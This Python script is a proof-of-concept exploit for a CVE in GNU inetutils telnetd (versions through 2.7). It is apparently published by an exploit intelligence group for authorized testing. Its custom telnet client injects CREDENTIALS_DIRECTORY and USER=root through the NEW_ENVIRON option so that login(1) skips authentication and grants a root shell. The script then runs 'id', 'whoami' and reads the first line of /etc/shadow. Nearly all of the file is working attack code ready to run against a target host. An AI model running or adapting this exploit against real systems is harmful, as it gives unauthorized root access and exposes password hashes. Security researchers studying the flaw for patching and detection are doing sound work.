#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : GNU inetutils telnetd Privilege Escalation
# CVE            : CVE-2026-28372
# Vendor         : GNU / Free Software Foundation
# Product        : GNU inetutils telnetd
# Affected       : All versions through 2.7 (inclusive)
# Type           : CWE-829 - Inclusion from Untrusted Control Sphere
# CVSS           : 7.4 (High)
# Platform       : Linux / Telnet
# Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2026-28372: GNU inetutils telnetd ≤2.7 — Local Privilege Escalation
via CREDENTIALS_DIRECTORY Environment Variable Injection

Demonstrates privilege escalation from any local user to root by injecting the
CREDENTIALS_DIRECTORY environment variable through the Telnet NEW_ENVIRON option
(RFC 1572). When util-linux login(1) >= 2.40 is used, the injected variable
causes login to skip all authentication if a 'login.noauth' file containing
'yes' exists in the specified directory.

ATTACK CHAIN:
  1. Attacker creates /tmp/fake_cred/login.noauth containing "yes"
  2. Attacker connects to local telnetd (port 23 or custom)
  3. During Telnet NEW_ENVIRON negotiation, attacker injects:
     - CREDENTIALS_DIRECTORY=/tmp/fake_cred
     - USER=root
  4. telnetd's scrub_env() blacklist does NOT filter CREDENTIALS_DIRECTORY
  5. login(1) -p (preserve env) finds CREDENTIALS_DIRECTORY, reads login.noauth
  6. login(1) skips all authentication → attacker gets root shell

PREREQUISITES:
  - GNU inetutils telnetd <= 2.7 running on target
  - util-linux >= 2.40 installed (login with systemd credentials support)
  - Attacker can create files (e.g., /tmp/fake_cred/login.noauth)
  - Network access to telnetd service

REFERENCES:
  - CVE-2026-28372
  - https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00000.html
  - https://www.openwall.com/lists/oss-security/2026/02/24/1
"""

import argparse
import os
import select
import socket
import sys
import time


# ============================================================================
# Telnet Protocol Constants (RFC 854, RFC 1572)
# ============================================================================
IAC   = 0xFF  # Interpret As Command
WILL  = 0xFB  # Option negotiation: sender will do option
WONT  = 0xFC  # Option negotiation: sender won't do option
DO    = 0xFD  # Option negotiation: request other side to do option
DONT  = 0xFE  # Option negotiation: request other side to not do option
SB    = 0xFA  # Subnegotiation Begin
SE    = 0xF0  # Subnegotiation End

# Telnet options
TELOPT_ECHO         = 0x01  # Echo
TELOPT_SGA          = 0x03  # Suppress Go Ahead
TELOPT_STATUS       = 0x05  # Status
TELOPT_TTYPE        = 0x18  # Terminal Type (RFC 1091)
TELOPT_NAWS         = 0x1F  # Window Size (RFC 1073)
TELOPT_TSPEED       = 0x20  # Terminal Speed (RFC 1079)
TELOPT_LFLOW        = 0x21  # Remote Flow Control (RFC 1372)
TELOPT_LINEMODE     = 0x22  # Linemode (RFC 1184)
TELOPT_XDISPLOC     = 0x23  # X Display Location (RFC 1096)
TELOPT_OLD_ENVIRON  = 0x24  # Old Environment Variables (RFC 1408)
TELOPT_NEW_ENVIRON  = 0x27  # New Environment Variables (RFC 1572)

# NEW_ENVIRON suboption qualifiers
TELQUAL_IS    = 0x00  # IS — response with variable values
TELQUAL_SEND  = 0x01  # SEND — request variable values
NEW_ENV_VAR   = 0x00  # Well-known variable
NEW_ENV_VALUE = 0x01  # Variable value follows
ENV_USERVAR   = 0x03  # User-defined variable

# Options we will agree to (WILL) when server sends DO
WILL_OPTIONS = {
    TELOPT_TTYPE,        # We'll send terminal type
    TELOPT_NEW_ENVIRON,  # We'll send environment (THIS IS THE EXPLOIT VECTOR)
    TELOPT_TSPEED,       # We'll send terminal speed
    TELOPT_XDISPLOC,     # We'll send X display location
    TELOPT_NAWS,         # We'll send window size
    TELOPT_LINEMODE,     # We'll do linemode
    TELOPT_LFLOW,        # We'll do flow control
}

# Options we accept from server (DO) when server sends WILL
DO_OPTIONS = {
    TELOPT_ECHO,    # Server echoes our input
    TELOPT_SGA,     # Server suppresses Go Ahead
    TELOPT_STATUS,  # Server provides status
}


class TelnetExploitClient:
    """
    A custom Telnet client that implements the CVE-2026-28372 exploit.

    Performs full Telnet option negotiation and injects the
    CREDENTIALS_DIRECTORY environment variable via the NEW_ENVIRON option
    to bypass login(1) authentication.
    """

    def __init__(self, host, port, cred_dir, target_user, timeout=30, verbose=False):
        self.host = host
        self.port = port
        self.cred_dir = cred_dir
        self.target_user = target_user
        self.timeout = timeout
        self.verbose = verbose

        self.sock = None
        self.env_injected = False
        self.ttype_requests = 0

    def log(self, msg):
        """Print a log message."""
        print(f"[*] {msg}")

    def success(self, msg):
        """Print a success message."""
        print(f"[+] {msg}")

    def error(self, msg):
        """Print an error message."""
        print(f"[-] {msg}")

    def debug(self, msg):
        """Print a debug message (only in verbose mode)."""
        if self.verbose:
            print(f"    [DBG] {msg}")

    def connect(self):
        """Establish TCP connection to the telnetd service."""
        self.log(f"Connecting to {self.host}:{self.port}...")
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            self.sock.setblocking(False)
            self.success(f"Connected to {self.host}:{self.port}")
            return True
        except socket.timeout:
            self.error(f"Connection timed out after {self.timeout}s")
            return False
        except ConnectionRefusedError:
            self.error(f"Connection refused — is telnetd running on {self.host}:{self.port}?")
            return False
        except OSError as e:
            self.error(f"Connection failed: {e}")
            return False

    def recv(self, timeout=2.0):
        """Receive data with timeout (non-blocking)."""
        ready = select.select([self.sock], [], [], timeout)
        if ready[0]:
            try:
                return self.sock.recv(8192)
            except (BlockingIOError, ConnectionResetError):
                return b''
        return b''

    def send(self, data):
        """Send raw bytes to the server."""
        self.sock.sendall(data)

    def send_naws(self):
        """Send NAWS (window size) subnegotiation: 80x24."""
        naws = bytes([IAC, SB, TELOPT_NAWS, 0, 80, 0, 24, IAC, SE])
        self.send(naws)
        self.debug("Sent NAWS: 80x24")

    def build_environ_payload(self):
        """
        Build the NEW_ENVIRON IS payload that injects:
          - CREDENTIALS_DIRECTORY=<cred_dir>  (triggers login.noauth bypass)
          - USER=<target_user>                (requests login as this user)

        Wire format (RFC 1572):
          IAC SB NEW_ENVIRON IS
            ENV_USERVAR <name> NEW_ENV_VALUE <value>
            ENV_USERVAR <name> NEW_ENV_VALUE <value>
          IAC SE
        """
        payload = bytes([IAC, SB, TELOPT_NEW_ENVIRON, TELQUAL_IS])

        # Inject CREDENTIALS_DIRECTORY — this is the vulnerability trigger
        payload += bytes([ENV_USERVAR])
        payload += b'CREDENTIALS_DIRECTORY'
        payload += bytes([NEW_ENV_VALUE])
        payload += self.cred_dir.encode('ascii')

        # Inject USER — request root login (used in login invocation template %U)
        payload += bytes([ENV_USERVAR])
        payload += b'USER'
        payload += bytes([NEW_ENV_VALUE])
        payload += self.target_user.encode('ascii')

        payload += bytes([IAC, SE])
        return payload

    def handle_subnegotiation(self, opt, sb_data):
        """Handle a single subnegotiation request from the server."""
        sb_cmd = sb_data[0] if sb_data else -1
        response = b''

        if opt == TELOPT_TTYPE and sb_cmd == TELQUAL_SEND:
            # Server requests terminal type — respond with 'xterm'
            self.ttype_requests += 1
            ttype = 'xterm'
            response = bytes([IAC, SB, TELOPT_TTYPE, TELQUAL_IS])
            response += ttype.encode('ascii')
            response += bytes([IAC, SE])
            self.debug(f"TTYPE request #{self.ttype_requests} → responding '{ttype}'")

        elif opt == TELOPT_TSPEED and sb_cmd == TELQUAL_SEND:
            # Server requests terminal speed
            response = bytes([IAC, SB, TELOPT_TSPEED, TELQUAL_IS])
            response += b'38400,38400'
            response += bytes([IAC, SE])
            self.debug("TSPEED → 38400,38400")

        elif opt == TELOPT_XDISPLOC and sb_cmd == TELQUAL_SEND:
            # Server requests X display location — send empty
            response = bytes([IAC, SB, TELOPT_XDISPLOC, TELQUAL_IS])
            response += bytes([IAC, SE])
            self.debug("XDISPLOC → (empty)")

        elif opt == TELOPT_NEW_ENVIRON and sb_cmd == TELQUAL_SEND:
            # *** THIS IS THE EXPLOIT ***
            # Server asks for our environment variables — inject the malicious ones
            response = self.build_environ_payload()
            self.env_injected = True
            self.success(
                f"INJECTED env vars via NEW_ENVIRON: "
                f"CREDENTIALS_DIRECTORY={self.cred_dir} USER={self.target_user}"
            )

        else:
            self.debug(f"Unhandled SB for option 0x{opt:02x}, cmd 0x{sb_cmd:02x}")

        return response

    def process_data(self, data):
        """
        Parse incoming telnet data stream. Respond to negotiation commands
        and extract plaintext output.

        Returns the decoded text portion (non-IAC data).
        """
        text = b''
        response = b''
        i = 0

        while i < len(data):
            if data[i] == IAC and i + 1 < len(data):
                cmd = data[i + 1]

                if cmd == IAC:
                    # Escaped IAC (literal 0xFF in data stream)
                    text += bytes([IAC])
                    i += 2

                elif cmd in (DO, DONT) and i + 2 < len(data):
                    opt = data[i + 2]
                    if cmd == DO:
                        if opt in WILL_OPTIONS:
                            response += bytes([IAC, WILL, opt])
                            self.debug(f"DO 0x{opt:02x} → WILL")
                        else:
                            response += bytes([IAC, WONT, opt])
                            self.debug(f"DO 0x{opt:02x} → WONT")
                    else:  # DONT
                        response += bytes([IAC, WONT, opt])
                        self.debug(f"DONT 0x{opt:02x} → WONT")
                    i += 3

                elif cmd in (WILL, WONT) and i + 2 < len(data):
                    opt = data[i + 2]
                    if cmd == WILL and opt in DO_OPTIONS:
                        response += bytes([IAC, DO, opt])
                        self.debug(f"WILL 0x{opt:02x} → DO")
                    else:
                        response += bytes([IAC, DONT, opt])
                        self.debug(f"{'WILL' if cmd == WILL else 'WONT'} 0x{opt:02x} → DONT")
                    i += 3

                elif cmd == SB:
                    # Subnegotiation: find the IAC SE terminator
                    end = data.find(bytes([IAC, SE]), i + 2)
                    if end < 0:
                        # Incomplete subnegotiation — wait for more data
                        break
                    sb_payload = data[i + 2:end]
                    if len(sb_payload) >= 1:
                        opt = sb_payload[0]
                        sb_data = sb_payload[1:]
                        response += self.handle_subnegotiation(opt, sb_data)
                    i = end + 2

                else:
                    # Other IAC command (NOP, BRK, etc.)
                    i += 2
            else:
                text += data[i:i + 1]
                i += 1

        # Send all accumulated responses
        if response:
            self.send(response)

        return text

    def exploit(self):
        """
        Execute the full exploit:
        1. Connect to telnetd
        2. Negotiate Telnet options
        3. Inject CREDENTIALS_DIRECTORY and USER via NEW_ENVIRON
        4. Wait for shell (login bypassed)
        5. Execute 'id' to confirm root access
        """
        print()
        print("=" * 65)
        print("  CVE-2026-28372: GNU inetutils telnetd Privilege Escalation")
        print("  CREDENTIALS_DIRECTORY injection via Telnet NEW_ENVIRON")
        print("=" * 65)
        print()
        print(f"  Target:    {self.host}:{self.port}")
        print(f"  Payload:   CREDENTIALS_DIRECTORY={self.cred_dir}")
        print(f"  User:      {self.target_user}")
        print()

        # Step 1: Connect
        if not self.connect():
            return False

        # Step 2: Send NAWS proactively (telnetd expects this)
        self.send_naws()

        # Step 3: Process Telnet negotiation
        # telnetd goes through several rounds of option negotiation before
        # launching login(1). We need to respond to all of them.
        self.log("Performing Telnet option negotiation...")
        all_text = b''
        negotiation_rounds = 0

        for rnd in range(25):
            time.sleep(0.4)
            data = self.recv(timeout=2.0)
            if not data:
                if rnd > 8:
                    break
                continue

            negotiation_rounds += 1
            text = self.process_data(data)
            all_text += text

            # Check if we've reached a shell or login prompt
            decoded = all_text.decode('ascii', errors='replace')
            if any(marker in decoded for marker in ['# ', '$ ', '~#', '~$']):
                self.debug("Detected shell prompt in output")
                break
            if 'ogin:' in decoded or 'assword:' in decoded:
                self.debug("Detected login/password prompt")
                break

        if not self.env_injected:
            self.error("NEW_ENVIRON injection did not occur!")
            self.error("Server may not have requested environment variables.")
            self.sock.close()
            return False

        self.log(f"Negotiation complete ({negotiation_rounds} rounds)")

        # Step 4: Check what we got
        decoded_text = all_text.decode('ascii', errors='replace')

        # If we got a login prompt, the exploit failed
        if 'ogin:' in decoded_text and '#' not in decoded_text:
            self.error("Got login prompt — authentication was NOT bypassed!")
            self.error("Possible causes:")
            self.error("  - util-linux login < 2.40 (no CREDENTIALS_DIRECTORY support)")
            self.error("  - login.noauth file doesn't exist or doesn't contain 'yes'")
            self.error(f"  - CREDENTIALS_DIRECTORY path ({self.cred_dir}) is wrong")
            self.sock.close()
            return False

        # Step 5: Send verification commands
        self.log("Sending verification commands...")

        # Send 'id' to check our UID
        self.send(b"id\r\n")
        time.sleep(1.5)

        id_output = b''
        for _ in range(5):
            data = self.recv(timeout=1.0)
            if data:
                id_output += self.process_data(data)
            else:
                break

        # Send 'whoami' for extra confirmation
        self.send(b"whoami\r\n")
        time.sleep(1.0)

        whoami_output = b''
        for _ in range(3):
            data = self.recv(timeout=1.0)
            if data:
                whoami_output += self.process_data(data)
            else:
                break

        # Send 'cat /etc/shadow | head -1' to prove root access
        self.send(b"head -1 /etc/shadow\r\n")
        time.sleep(1.0)

        shadow_output = b''
        for _ in range(3):
            data = self.recv(timeout=1.0)
            if data:
                shadow_output += self.process_data(data)
            else:
                break

        # Combine all output for analysis
        combined = (all_text + id_output + whoami_output + shadow_output).decode(
            'ascii', errors='replace'
        )

        # Step 6: Report results
        print()
        print("-" * 65)
        print("  EXPLOIT RESULTS")
        print("-" * 65)

        id_decoded = id_output.decode('ascii', errors='replace').strip()
        whoami_decoded = whoami_output.decode('ascii', errors='replace').strip()
        shadow_decoded = shadow_output.decode('ascii', errors='replace').strip()

        if id_decoded:
            print(f"  id output:     {id_decoded}")
        if whoami_decoded:
            print(f"  whoami output:  {whoami_decoded}")
        if shadow_decoded:
            print(f"  /etc/shadow:   {shadow_decoded}")

        print("-" * 65)

        if 'uid=0(root)' in combined:
            print()
            self.success("VULNERABILITY CONFIRMED — CVE-2026-28372")
            self.success(f"Root shell obtained without password!")
            self.success(f"  → Login authentication bypassed via CREDENTIALS_DIRECTORY injection")
            self.success(f"  → CREDENTIALS_DIRECTORY={self.cred_dir}")
            self.success(f"  → login.noauth=yes → login(1) skipped all authentication")
            print()
            print("=" * 65)
            print("  [✓] EXPLOIT SUCCESSFUL — uid=0(root) confirmed")
            print("=" * 65)
            self.sock.close()
            return True
        elif 'root' in whoami_decoded:
            print()
            self.success("VULNERABILITY LIKELY CONFIRMED — whoami returned 'root'")
            print("=" * 65)
            print("  [✓] EXPLOIT SUCCESSFUL — root access confirmed via whoami")
            print("=" * 65)
            self.sock.close()
            return True
        else:
            print()
            self.error("Could not confirm root access")
            self.error(f"Combined output: {repr(combined[-300:])}")
            print("=" * 65)
            print("  [✗] EXPLOIT RESULT INCONCLUSIVE")
            print("=" * 65)
            self.sock.close()
            return False


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-28372: GNU inetutils telnetd privilege escalation PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Against lab container (default settings)
  %(prog)s 172.22.0.6 -p 2323

  # With custom credential directory
  %(prog)s 10.0.0.1 -p 23 --cred-dir /tmp/fake_cred

  # Verbose mode for debugging
  %(prog)s 172.22.0.6 -p 2323 -v
"""
    )
    parser.add_argument(
        'host', nargs='?', default='172.22.0.6',
        help='Target host running telnetd (default: 172.22.0.6)'
    )
    parser.add_argument(
        '-p', '--port', type=int, default=2323,
        help='Target port (default: 2323)'
    )
    parser.add_argument(
        '--cred-dir', default='/home/weakuser/fake_cred',
        help='Path to attacker-controlled credential directory on target '
             '(default: /home/weakuser/fake_cred)'
    )
    parser.add_argument(
        '--user', default='root',
        help='Target user to escalate to (default: root)'
    )
    parser.add_argument(
        '-v', '--verbose', action='store_true',
        help='Enable verbose/debug output'
    )
    parser.add_argument(
        '-t', '--timeout', type=int, default=30,
        help='Connection timeout in seconds (default: 30)'
    )

    args = parser.parse_args()

    client = TelnetExploitClient(
        host=args.host,
        port=args.port,
        cred_dir=args.cred_dir,
        target_user=args.user,
        timeout=args.timeout,
        verbose=args.verbose,
    )

    success = client.exploit()
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
